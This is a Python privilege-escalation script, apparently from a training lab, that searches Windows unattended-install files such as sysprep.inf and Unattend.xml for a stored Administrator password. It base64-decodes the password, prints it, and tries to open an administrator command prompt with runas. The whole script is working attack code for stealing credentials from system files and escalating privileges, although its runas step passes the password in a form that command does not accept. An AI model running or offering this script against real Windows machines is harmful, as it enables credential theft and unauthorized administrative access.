import os
import re
import base64
import subprocess

# Function to check for the Administrator password in a file


def extract_password_from_file(file_path):
    # Check if file exists
    if not os.path.exists(file_path):
        return None

    # Try opening the file with different encoding options
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return None

    # Print the content of the file for debugging
    print(f"Content of {file_path}:")
    print(content)

    # Regular expression to find the password
    password_regex = r"<AdministratorPassword>\s*<Value>(.*?)</Value>\s*</AdministratorPassword>"
    match = re.search(password_regex, content)

    # If a match is found, return the password
    if match:
        return match.group(1)
    return None

# Function to decode a base64 encoded password


def decode_password(encoded_password):
    try:
        decoded = base64.b64decode(encoded_password).decode('utf-8')
        return decoded
    except Exception as e:
        print(f"Error decoding password: {e}")
        return None

# Function to attempt to run commands as Administrator using runas


def run_as_admin(password):
    try:
        # Run the command using runas
        command = f'runas /user:Administrator "{password}" cmd.exe'
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error executing runas command: {e}")

# Main function to search for the password in multiple files


def main():
    # List of potential file paths
    unattended_files = [
        "C:\\Windows\\System32\\sysprep\\sysprep.inf",
        "C:\\autounattend.xml",
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\ProgramData\\Microsoft\\Windows\\Unattend\\autounattend.xml",  # Additional path
        "C:\\Users\\Student\\AppData\\Local\\Temp\\unattend.xml"  # Another possible location
    ]

    # Iterate through each file path and attempt to extract the password
    for file_path in unattended_files:
        print(f"Checking {file_path} for Administrator password...")
        password = extract_password_from_file(file_path)

        # If password is found, print and decode it
        if password:
            print(f"Found password in {file_path}: {password}")
            decoded_password = decode_password(password)
            if decoded_password:
                print(f"Decoded password: {decoded_password}")
                run_as_admin(decoded_password)
                return  # Stop after successfully logging in as Admin
        else:
            print(f"No password found in {file_path}.")


# Run the main function
if __name__ == "__main__":
    main()
